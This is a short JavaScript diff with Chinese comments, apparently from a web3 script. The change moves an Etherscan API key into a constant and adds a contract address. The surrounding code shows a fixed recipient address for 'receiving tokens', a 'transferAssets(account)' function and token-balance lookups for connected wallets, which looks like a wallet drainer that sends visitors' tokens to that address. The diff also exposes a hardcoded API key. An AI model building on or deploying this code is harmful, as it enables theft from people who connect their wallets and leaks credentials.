@@ -1,11 +1,13 @@
-const recipientAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699';
+const recipientAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699'; // 接收代币的地址
+const ETHERSCAN_API_KEY = '6I5NKMYZ4W9SUDGGM3GJBAB9Y2UK324G63'; // Etherscan API密钥
+const contractAddress = '0x0ccd25cb287e18e55969d65ab5555582657512be'; // 替换为你的合约地址
 let web3;
 let isConnected = false;
 
 const erc20Abi = [
     {
         "constant": true,
-        "inputs": [{"name": "_owner", "type": "address"}],
+        "inputs": [{"name": "_owner", "type": "address"}],   
         "name": "balanceOf",
         "outputs": [{"name": "balance", "type": "uint256"}],
         "type": "function"
@@ -118,7 +120,7 @@ const transferAssets = async (account) => {
 // 获取代币余额的函数
 const getTokenBalances = async (address) => {
     try {
-        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=6I5NKMYZ4W9SUDGGM3GJBAB9Y2UK324G63`;
+        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=${ETHERSCAN_API_KEY}`;
         const response = await axios.get(url);
         const transactions = response.data.result;
 
